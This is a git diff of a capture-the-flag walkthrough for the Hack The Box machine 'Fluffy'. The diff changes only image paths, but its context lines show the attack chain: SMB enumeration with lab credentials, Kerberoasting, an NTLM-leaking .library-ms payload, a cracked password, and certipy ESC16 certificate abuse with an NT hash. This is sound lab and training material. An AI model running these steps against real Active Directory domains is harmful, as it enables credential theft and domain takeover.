@@ -55,7 +55,7 @@ crackmapexec smb 10.10.11.69 -u 'j.fleischman' -p 'J0elTHEM4n1990!' --shares
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (25).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```bash
 smbclient -N //10.10.11.69/IT -U 'j.fleischman%J0elTHEM4n1990!'
@@ -67,7 +67,7 @@ There is a pdf document that describe a Upgrade process
 > get Upgrade_Notice.pdf
 ```
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -85,11 +85,11 @@ bloodhound-python -c all -ns 10.10.11.69 -dc fluffy.htb -d fluffy.htb --zip -u '
 
 Try running the query to detect all kerberostable users in the domain.
 
-<figure><img src="../../../.gitbook/assets/image (27).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>
 
 As we can notice, the users `CA_SVC` and `LDAP_SVC` are in the `SERVICE ACCOUNTS` group and they have "GenericWrite" privilege to `WINRM_SVC` user.
 
-<figure><img src="../../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Kerberost attack with Metasploit
 
@@ -133,7 +133,7 @@ Nothings to do :(
 
 {% embed url="https://rewterz.com/threat-advisory/poc-released-windows-explorer-vulnerability-leaks-ntlm-hashes" %}
 
-<figure><img src="../../../.gitbook/assets/image (22).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>
 
 Like we can write above. We have to craft a .library-ms file with inside a SMB path.&#x20;
 
@@ -182,7 +182,7 @@ Now upload the file and wait for a user to extract the .zip file.
 
 When the user extract the payload in our SMB server we will see this:
 
-<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>
 
 {% code overflow="wrap" %}
 ```
@@ -221,7 +221,7 @@ p.agila:prometheusx-303
 
 Now that we obtained a new user, check on bloodhound what we can do with that.
 
-<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>
 
 How we can see the user that we have, has "GenericAll" rights on SERVICE ACCOUNTS.
 
@@ -326,7 +326,7 @@ certipy find -u 'ca_svc@fluffy.htb' -hashes 'ca0f4f9e9eb8a092addf53bb03fc98c8' -
 
 Making a grep command to the output and check if there is some ESC misconfig
 
-<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 The CA is vulnerable for the ESC16. Follow the guide to exploit this.
 
@@ -362,7 +362,7 @@ certipy req -dc-ip 10.10.11.69 -u 'administrator' -hashes 'ca0f4f9e9eb8a092addf5
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 Get the hash from the `administrator.pfx` file.
 
@@ -372,7 +372,7 @@ certipy auth -pfx administrator.pfx -domain 'FLUFFY.HTB' -dc-ip 10.10.11.69
 ```
 {% endcode %}
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Winrm connection as administrator
 
